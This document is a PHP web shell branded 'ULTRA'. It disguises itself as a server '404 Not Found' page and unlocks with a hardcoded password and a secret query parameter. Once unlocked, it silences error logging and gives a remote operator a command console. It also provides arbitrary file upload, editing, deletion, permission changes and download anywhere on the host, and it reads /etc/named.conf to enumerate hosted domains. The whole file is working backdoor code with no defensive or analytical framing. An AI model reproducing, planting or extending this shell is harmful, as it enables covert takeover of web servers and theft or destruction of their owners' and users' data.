<?php
error_reporting(0);
ini_set('max_execution_time', 0);
session_start();
$name = "mega-super";
function login()
{
$random_url = mt_rand(1000000, 247345736453);
$curl = curl_init();
$protocol = 'http://';
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
        $protocol = 'https://';
    }
    curl_setopt($curl, CURLOPT_URL, $protocol . $_SERVER['HTTP_HOST'] . '/' . $random_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $server_404 = curl_exec($curl);
    $server_404 = str_replace("/{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
    $server_404 = str_replace("{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
    echo $server_404;
    exit;
}
if (!isset($_SESSION[md5($sexy)])) {
    if (isset($_GET[$name]) && $_GET[$name] == $name) {
        $_SESSION[md5($sexy)] = true;
    } else {
        login();
    }
}

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "babihutan-v1";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?xXx 見えない xXx'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?見えない'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>404 Not Found</title>
<link rel="icon" https://1.top4top.net/p_14405v3810.jpg"><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">



<html><head><title>404 Not Found</title></head>
<style> 
input { margin:0;background-color:#fff;border:1px solid #fff; } 
</style> 
<body>
<h1>Not Found</h1>
<p>The requested URL  was not found on this server.</p><hr>
<form method=post>
<input type="password" name="password"></form></body></html>
      
      <br>
      <br>
      <?php echo $_SESSION['forbidden']; ?>
    </form>
  </td>
</table>
<?php
exit();
}
?>
<?php

session_start();
error_reporting(0);
set_time_limit(0);
@ini_set('error_log', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if (isset($_GET['action']) && $_GET['action'] == 'download') {
    @ob_clean();
    $file = $_GET['item'];
    header('Content-Description: File Transfer');
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

function flash($message, $status, $class, $redirect = false) {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    $_SESSION["message"] = $message;
    $_SESSION["class"] = $class;
    $_SESSION["status"] = $status;
    if ($redirect) {
        header('Location: ' . $redirect);
        exit();
    }
    return true;
}

function clear() {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    return true;
}

function writable($path, $perms){
    return (!is_writable($path)) ? "<font color=\"red\">".$perms."</font>" : "<font color=\"lime\">".$perms."</font>";
}

function perms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } 
    elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } 
    elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } 
    elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } 
    elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } 
    elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } 
    elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } 
    else {
        // Unknown
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function fsize($file) {
    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos = 0;
    $size = filesize($file);
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2)." ".$a[$pos];
}

if (isset($_GET['dir'])) {
    $path = $_GET['dir'];
    chdir($_GET['dir']);
} else {
    $path = getcwd();
}

$path = str_replace('\\', '/', $path);
$exdir = explode('/', $path);

function getOwner($item) {
    if (function_exists("posix_getpwuid")) {
        $downer = @posix_getpwuid(fileowner($item));
        $downer = $downer['name'];
    } else {
        $downer = fileowner($item);
    }
    if (function_exists("posix_getgrgid")) {
        $dgrp = @posix_getgrgid(filegroup($item));
        $dgrp = $dgrp['name'];
    } else {
        $dgrp = filegroup($item);
    }
    return $downer . '/' . $dgrp;
}

if (isset($_POST['newFolderName'])) {
    if (mkdir($path . '/' . $_POST['newFolderName'])) {
        flash("Create Folder Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create Folder Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
    if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) {
        flash("Create File Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create File Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newName']) && isset($_GET['item'])) {
    if ($_POST['newName'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (rename($path. '/'. $_GET['item'], $_POST['newName'])) {
        flash("Rename Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Rename Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newContent']) && isset($_GET['item'])) {
    if (file_put_contents($path. '/'. $_GET['item'], $_POST['newContent'])) {
        flash("Edit Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Edit Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newPerm']) && isset($_GET['item'])) {
    if ($_POST['newPerm'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) {
        flash("Change Permission Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Change Permission", "Failed", "error", "?dir=$path");
    }
}
if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
    if (is_dir($_GET['item'])) {
        if (rmdir($_GET['item'])) {
            flash("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            flash("Delete Failed", "Failed", "error", "?dir=$path");
        }
    } else {
        if (unlink($_GET['item'])) {
            flash("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            flash("Delete Failed", "Failed", "error", "?dir=$path");
        }
    }
}

if (isset($_FILES['uploadfile'])) {
    $total = count($_FILES['uploadfile']['name']);
    for ($i = 0; $i < $total; $i++) {
        $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
    }
    if ($total < 2) {
        if ($mainupload) {
            flash("Upload File Successfully! ", "Success", "success", "?dir=$path");
        } else {
            flash("Upload Failed", "Failed", "error", "?dir=$path");
        }
    }
    else{
        if ($mainupload) {
            flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
        } else {
            flash("Upload Failed", "Failed", "error", "?dir=$path");
        }
    }
}

$dirs = scandir($path);

$d0mains = @file("/etc/named.conf", false);
if (!$d0mains){
    $dom = "Cant read [ /etc/named.conf ]";
    $GLOBALS["need_to_update_header"] = "true";
}else{ 
    $count = 0;
    foreach ($d0mains as $d0main){
        if (@strstr($d0main, "zone")){
            preg_match_all('#zone "(.*)"#', $d0main, $domains);
            flush();
            if (strlen(trim($domains[1][0])) > 2){
                flush();
                $count++;
            }
        }
    }
    $dom = "$count Domain";
}

$ip = gethostbyname($_SERVER['HTTP_HOST']);
$uip = $_SERVER['REMOTE_ADDR'];
$serv = $_SERVER['HTTP_HOST']; 
$soft = $_SERVER['SERVER_SOFTWARE'];
$uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($cmd_uname) > 0 ? $cmd_uname : 'Uname Error!');

?>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
        <title>ULTRA [ <?= $serv; ?> ]</title>
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
        <style type="text/css">
            * {
                font-family: Ubuntu Mono;
            }
            a {
                text-decoration: none;
                color: white;
            }
            a:hover {
                color: white;
            }
            /* width */
            ::-webkit-scrollbar {
                width: 7px;
                height: 7px;
            }
            /* Handle */
            ::-webkit-scrollbar-thumb {
                background: grey;
                border-radius: 7px;
            }
            /* Track */
            ::-webkit-scrollbar-track {
                box-shadow: inset 0 0 7px grey;
                border-radius: 7px;
            }
            .td-break {
                word-break: break-all
            }
        </style>
    </head>
    <body class="bg-dark text-light">
        <div class="container-fluid">
            <div class="py-3" id="main">
                <div class="p-4 rounded-3">
                    <table class="table table-borderless text-light">
                        <tr>
                            <td><i class="fa fa-server"></i>&ensp;<?= $uname; ?></td>
                        </tr>

                        <tr>
                            <td><i class="fa fa-microchip"></i>&ensp;<?= $soft; ?></td>
                        </tr>

                        <tr>
                            <td><i class="fa fa-satellite-dish"></i>&ensp;<?= $ip; ?>&ensp;|&ensp;Your IP: <?= $uip; ?></td>
                        </tr>

                        <tr>
                            <td><i class="fa fa-fingerprint"></i>&ensp;<?= $dom; ?></td>
                        </tr>

                        <tr>
                            <td><i class="fas fa-cog"></i>&nbsp;[&nbsp;<?php echo writable($path, perms($path)) ?>&nbsp;]</td>
                        </tr>
                        <tr>
                            <td>
                                <i class="fa fa fa-folder pt-1"></i>&ensp;
                                <?php foreach ($exdir as $id => $pat) : if ($pat == '' && $id == 0): ?>
                                    <a href="?dir=/" class="text-decoration-none text-light">/</a>
                                <?php endif; if ($pat == '') continue; ?>
                                    <a href="?dir=<?php for ($i = 0; $i <= $id; $i++) { echo "$exdir[$i]"; if ($i != $id) echo "/"; } ?>" class="text-decoration-none text-light"><?= $pat ?></a>
                                    <span class="text-light"> /</span>
                                <?php endforeach; ?>
                            </td>
                        </tr>
                    </table>
                    <div class="d-flex justify-content-between">
                        <div class="p-2">
                            <form action="" method="post">
                                <label for="name" class="form-label">Console</label>
                                <div class="row">
                                    <div class="col-md-9 mb-3">
                                        <input type="text" class="form-control form-control-sm" name="bdcmd" placeholder="whoami">
                                    </div>
                                    <div class="col-md-3">
                                        <button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="p-2">
                            <form action="" method="post" enctype="multipart/form-data">
                                <label for="name" class="form-label">Upload</label>
                                <div class="row">
                                    <div class="col-md-9 mb-3">
                                        <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
                                    </div>
                                    <div class="col-md-3">
                                        <button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>

                    <div class="container" id="tool">
                        <div class="col-md-12">
                            <div class="collapse" id="newFileCollapse" data-bs-parent="#tool">
                                <div class="row justify-content-center">
                                    <div class="col-md-6">
                                        <form action="" method="post">
                                            <div class="mb-3">
                                                <label class="form-label">File Name</label>
                                                <input type="text" class="form-control" name="newFileName" placeholder="test.php">
                                            </div>
                                            <div class="mb-3">
                                                <label class="form-label">File Content</label>
                                                <textarea class="form-control" rows="5" name="newFileContent" placeholder="Hello-World"></textarea>
                                            </div>
                                            <button type="submit" class="btn btn-outline-light">Create</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="collapse" id="newFolderCollapse" data-bs-parent="#tool">
                                <div class="row justify-content-center">
                                    <div class="col-md-6">
                                        <form action="" method="post">
                                            <div class="mb-3">
                                                <label class="form-label">Folder Name</label>
                                                <input type="text" class="form-control" name="newFolderName" placeholder="home">
                                            </div>
                                            <button type="submit" class="btn btn-outline-light">Create</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="container">

                        <?php if (isset($_POST['bdcmd'])) : ?>
                        <div class="p-2">
                            <div class="row justify-content-center">
                                <div class="card text-dark mb-3">
                                    <pre><?php echo $ip."@".$serv.":&nbsp;~$&nbsp;"; $cmd = $_POST['bdcmd']; echo $cmd."<br>"; ?><br><code><?php echo cmd($cmd); ?></code></pre>
                                </div>
                            </div>
                        </div>
                        <?php endif; ?>

                        <?php if (isset($_GET['action']) && $_GET['action'] != 'download') : $action = $_GET['action'] ?>
                        <?php endif; ?>
                        <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>
                            <div class="col-md-12">
                                <div class="row justify-content-center">
                                    <div class="col-md-6">
                                        <?php if ($action == 'rename' && isset($_GET['item'])) : ?>
                                            <form action="" method="post">
                                                <div class="mb-3">
                                                    <label for="name" class="form-label">New Name</label>
                                                    <input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
                                                </div>
                                                <button type="submit" class="btn btn-outline-light">Submit</button>
                                                <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                            </form>
                                        <?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>
                                            <form action="" method="post">
                                                <div class="mb-3">
                                                    <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                                                    <textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control"><?= htmlspecialchars(file_get_contents($path. '/'. $_GET['item'])) ?></textarea>
                                                </div>
                                                <button type="submit" class="btn btn-outline-light">Submit</button>
                                                <button type="button" class="btn btn-outline-light" onclick="jscopy()">Copy</button>
                                                <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                            </form>
                                        <?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>
                                            <form action="" method="post">
                                                <div class="mb-3">
                                                    <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                                                    <input type="text" class="form-control" name="newPerm" value="<?= substr(sprintf('%o', fileperms($_GET['item'])), -4); ?>">
                                                </div>
                                                <button type="submit" class="btn btn-outline-light">Submit</button>
                                                <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                            </form>
                                        <?php endif; ?>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                    </div>
                    <div class="table-responsive">
                        <table class="table table-hover table-dark align-middle text-light">
                            <thead class="align-middle">
                                <tr>
                                    <td style="width:35%">Name</td>
                                    <td style="width:10%">Type</td>
                                    <td style="width:10%">Size</td>
                                    <td style="width:13%">Owner/Group</td>
                                    <td style="width:10%">Permission</td>
                                    <td style="width:13%">Last Modified</td>
                                    <td style="width:9%">Actions</td>
                                </tr>
                            </thead>
                            <tbody class="text-nowrap">
                                <?php
                                    foreach ($dirs as $dir) :
                                    if (!is_dir($dir)) continue;
                                ?>
                                <tr>
                                    <td>
                                        <?php if ($dir === '..') : ?>
                                            <a href="?dir=<?= dirname($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php elseif ($dir === '.') :  ?>
                                            <a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php else : ?>
                                            <a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
                                        <?php endif; ?>
                                    </td>
                                    <td class="text-light"><?= filetype($dir) ?></td>
                                    <td class="text-light">-</td>
                                    <td class="text-light"><?= getOwner($dir) ?></td>
                                    <td class="text-light">
                                        <?php
                                            echo '<a href="?dir='.$path.'&item='.$dir.'&action=chmod">';
                                                if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
                                                elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
                                                echo perms($path.'/'.$dir);
                                                if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
                                            echo '</a>';
                                        ?>
                                    </td>
                                    <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
                                    <td>
                                        <?php if ($dir != '.' && $dir != '..') : ?>
                                            <div class="btn-group">
                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Rename"><i class="fa fa-edit"></i></a>
                                                <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')" data-toggle="tooltip" data-placement="auto" title="Delete"><i class="fa fa-trash"></i></a>
                                            </div>
                                        <?php elseif ($dir === '.') : ?>
                                        <div class="btn-group">
                                            <a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="New Folder"><i class="fa fa-folder-plus"></i></a>
                                            <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="New File"><i class="fa fa-file-plus"></i></a>
                                        </div>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                                    <?php
                                        foreach ($dirs as $dir) :
                                        if (!is_file($dir)) continue;
                                    ?>
                                    <tr>
                                        <td>
                                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
                                        </td>
                                        <td class="text-light"><?= (function_exists('mime_content_type') ? mime_content_type($dir) : filetype($dir)) ?></td>
                                        <td class="text-light"><?= fsize($dir) ?></td>
                                        <td class="text-light"><?= getOwner($dir) ?></td>
                                        <td class="text-light">
                                            <?php
                                                echo '<a href="?dir='.$path.'&item='.$dir.'&action=chmod">';
                                                    if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
                                                    elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
                                                    echo perms($path.'/'.$dir);
                                                    if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
                                                echo '</a>';
                                            ?>
                                        </td>
                                        <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
                                        <td>
                                            <?php if ($dir != '.' && $dir != '..') : ?>
                                                <div class="btn-group">
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Edit"><i class="fa fa-file-edit"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Rename"><i class="fa fa-edit"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=download" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Download"><i class="fa fa-file-download"></i></a>
                                                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')" data-toggle="tooltip" data-placement="auto" title="Delete"><i class="fa fa-trash"></i></a>
                                                </div>
                                            <?php endif; ?>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    <center>
                        <div class="text-light">&#169; ULTRA</div>
                    </center>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
        <script>
            <?php if (isset($_SESSION['message'])) : ?>
                Swal.fire(
                '<?= $_SESSION['status'] ?>',
                '<?= $_SESSION['message'] ?>',
                '<?= $_SESSION['class'] ?>'
                )
            <?php endif; clear(); ?>
            function deleteConfirm(url) {
            event.preventDefault()
            Swal.fire({
                title: 'Are you sure?',
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#3085d6',
                cancelButtonColor: '#d33',
                confirmButtonText: 'Yes, delete it!'
            }).then((result) => {
                if (result.isConfirmed) {
                        window.location.href = url
                    }
                })
            }
            function jscopy() {
                var jsCopy = document.getElementById("CopyFromTextArea");
                jsCopy.focus();
                jsCopy.select();
                document.execCommand("copy");
            }
        </script>
    </body>
</html>
